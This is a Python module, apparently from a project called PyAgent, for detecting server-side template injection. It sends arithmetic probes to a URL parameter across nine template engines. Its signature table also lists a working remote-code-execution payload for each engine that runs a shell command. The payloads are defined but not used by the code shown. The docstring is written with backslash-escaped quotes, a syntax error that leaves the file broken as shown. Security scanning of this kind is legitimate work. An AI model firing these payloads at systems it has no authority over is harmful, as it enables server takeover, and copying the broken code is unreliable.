#!/usr/bin/env python3
# Copyright 2026 PyAgent Authors
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import asyncio
import aiohttp
import re
from typing import Dict, List, Optional, Any

# Ported and enhanced from tplmap engines and common SSTI research
SSTI_ENGINE_SIGNATURES = {
    "jinja2": {
        "detection_payloads": ["{{7*7}}", "{{7*'7'}}"],
        "verification_regex": r"49|7777777",
        "description": "Python based template engine",
        "rce_payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
    },
    "twig": {
        "detection_payloads": ["{{7*7}}", "{{7*'7'}}"],
        "verification_regex": r"49|7777777",
        "description": "PHP based template engine",
        "rce_payload": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
    },
    "smarty": {
        "detection_payloads": ["{7*7}"],
        "verification_regex": r"49",
        "description": "PHP based template engine",
        "rce_payload": "{system('id')}"
    },
    "mako": {
        "detection_payloads": ["${7*7}"],
        "verification_regex": r"49",
        "description": "Python based template engine",
        "rce_payload": "${__import__('os').popen('id').read()}"
    },
    "tornado": {
        "detection_payloads": ["{{7*7}}"],
        "verification_regex": r"49",
        "description": "Python based web framework engine",
        "rce_payload": "{{ import os; os.popen('id').read() }}"
    },
    "velocity": {
        "detection_payloads": ["#set($x=7*7)$x"],
        "verification_regex": r"49",
        "description": "Java based template engine",
        "rce_payload": "#set($str=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\").getInputStream())#foreach($i in [1..$str.available()])$str.read()#end"
    },
    "freemarker": {
        "detection_payloads": ["${7*7}"],
        "verification_regex": r"49",
        "description": "Java based template engine",
        "rce_payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }"
    },
    "erb": {
        "detection_payloads": ["<%= 7*7 %>"],
        "verification_regex": r"49",
        "description": "Ruby based template engine",
        "rce_payload": "<%= `id` %>"
    },
    "slim": {
        "detection_payloads": ["#{7*7}"],
        "verification_regex": r"49",
        "description": "Ruby based template engine",
        "rce_payload": "#{`id`}"
    }
}

async def detect_ssti(url: str, parameter: str, session: aiohttp.ClientSession) -> List[Dict[str, Any]]:
    \"\"\"
    Detects Server Side Template Injection in a specific URL parameter.
    \"\"\"
    detected_engines = []
    
    for engine, data in SSTI_ENGINE_SIGNATURES.items():
        for payload in data["detection_payloads"]:
            params = {parameter: payload}
            try:
                async with session.get(url, params=params, timeout=5) as response:
                    text = await response.text()
                    if re.search(data["verification_regex"], text):
                        # Potential match, try second payload if available to confirm
                        if len(data["detection_payloads"]) > 1:
                            second_payload = data["detection_payloads"][1]
                            async with session.get(url, params={parameter: second_payload}, timeout=5) as resp2:
                                text2 = await resp2.text()
                                if re.search(data["verification_regex"], text2):
                                    detected_engines.append({
                                        "engine": engine,
                                        "description": data["description"],
                                        "payload": payload,
                                        "parameter": parameter
                                    })
                                    break
                        else:
                            detected_engines.append({
                                "engine": engine,
                                "description": data["description"],
                                "payload": payload,
                                "parameter": parameter
                            })
                            break
            except Exception:
                continue
                
    return detected_engines

if __name__ == "__main__":
    # Example usage logic
    pass
